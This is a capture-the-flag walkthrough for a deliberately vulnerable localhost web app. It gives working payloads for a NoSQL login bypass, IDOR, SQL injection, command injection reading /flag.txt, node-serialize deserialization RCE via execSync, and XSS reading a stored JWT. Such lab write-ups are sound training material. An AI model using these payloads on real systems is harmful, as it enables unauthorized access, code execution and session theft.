# DevSecOps CTF Walkthrough

This document outlines the exact methodologies, payloads, and steps required to exploit the deeply integrated vulnerabilities within the application and capture the hidden flag: `apteshr{tell_ME_are_you_0_OR_1**you have root permission}`.

---

## 1. Broken Authentication (Login Bypass)
**Vulnerability**: Improper Type Validation / NoSQL Injection Concept
**Goal**: Gain initial access to the application without knowing valid credentials.

The authentication controller expects a string for the password to compare with bcrypt. If an object is passed, Type Confusion occurs, and our specific vulnerable implementation drops the password check entirely.

### Exploitation Steps:
1. Open a proxy tool like **Burp Suite** or use `curl`.
2. Intercept the standard Login POST request.
3. Modify the JSON payload so the password is an object instead of a string:
```bash
curl -X POST http://localhost:5000/api/auth/login \
     -H "Content-Type: application/json" \
     -d '{"email": "admin@cmr.local", "password": {"$gt": ""}}'
```
4. **Result**: The server returns a `200 OK` with a valid JWT token for the admin user.

---

## 2. Broken Access Control (IDOR)
**Vulnerability**: Insecure Direct Object Reference
**Goal**: Locate the hidden database flag by reading administrative records.

The standard `/api/appointments/:id` endpoint natively returns appointment details but fails to check if the `req.user.id` matches the appointment's `user_id`.

### Exploitation Steps:
1. Log in (either via standard credentials or the Broken Auth bypass) to get a JWT token.
2. In the Dashboard interface, click on your own appointment and intercept the request, or use an API testing tool.
3. Change the URL parameter to `1` (which corresponds to the seeded Admin appointment):
```bash
curl http://localhost:5000/api/appointments/1 \
     -H "Authorization: Bearer <YOUR_JWT_TOKEN>"
```
4. **Result**: The server exposes the sensitive payload:
```json
{
  "success": true,
  "data": {
    "id": 1,
    "user_id": 1,
    "status": "Confidential - apteshr{tell_ME_are_you_0_OR_1**you have root permission}"
  }
}
```

---

## 3. SQL Injection (SQLi)
**Vulnerability**: Unsanitized Input Concatenation
**Goal**: Dump the full database to find the flag without enumerating IDs.

The generic Dashboard search feature aggregates appointments using `LIKE '%${query}%'`. 

### Exploitation Steps:
1. Log into the Dashboard.
2. In the "Rechercher statut..." input box, enter the following SQL payload to short-circuit the `WHERE` clause:
`' OR 1=1 -- `
3. Hit Search.
4. **Result**: The `WHERE` clause evaluates to true for every single row in the database, indiscriminately dumping all appointments onto the screen—instantly revealing the Admin's hidden appointment row containing the flag.

---

## 4. Command Injection (RCE)
**Vulnerability**: Unsanitized input passed to `child_process.exec()`
**Goal**: Access the server filesystem and read `/flag.txt`.

The "Check Server Status" tool on the Contact page is designed to ping an IP address. It blindly relies on bash execution.

### Exploitation Steps:
1. Navigate to the Contact page.
2. In the "Serveur & Stabilité" input box, use command chaining (like `;`, `&&`, or `||`) to terminate the `ping` command and inject arbitrary bash commands:
**Payload**: `127.0.0.1; cat /flag.txt`
3. Click "Vérifier".
4. **Result**: 
```text
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: seq=0 ttl=42 time=0.038 ms
...
apteshr{tell_ME_are_you_0_OR_1**you have root permission}
```

---

## 5. Insecure Deserialization (RCE)
**Vulnerability**: Unsafe Unserialization via `node-serialize`
**Goal**: Gain remote code execution by injecting a malicious JavaScript Immediately Invoked Function Expression (IIFE).

### Exploitation Steps:
1. Go to the Dashboard and find the "Importer Préférences (JSON)" box.
2. The `serialize` module natively executes code if a function literal is appended with `()`. We can instruct the Node environment to read the flag and log it, or exfiltrate it. 
**Payload**:
```json
{
  "rce": "_$$ND_FUNC$$_function() { require('child_process').execSync('cat /flag.txt > uploads/flag_exfil.txt'); }()"
}
```
3. Submit the form.
4. **Result**: The server processes the payload and quietly executes the synchronous system command, copying the internal flag over to the `/uploads` directory where it can be retrieved, confirming full RCE.

---

## 6. Reflected Cross-Site Scripting (XSS)
**Vulnerability**: Unsanitized input reflected into the DOM.
**Goal**: Execute malicious JavaScript in a victim's browser context.

### Exploitation Steps:
1. Go to the Contact page's "Recherche dans la FAQ" form.
2. Input standard XSS test vectors:
**Payload**: `<script>alert(localStorage.getItem('token'))</script>`
3. **Result**: The browser instantly renders the HTML and pops up an alert box displaying your active, hyper-sensitive JWT token, demonstrating complete session hijack potential.
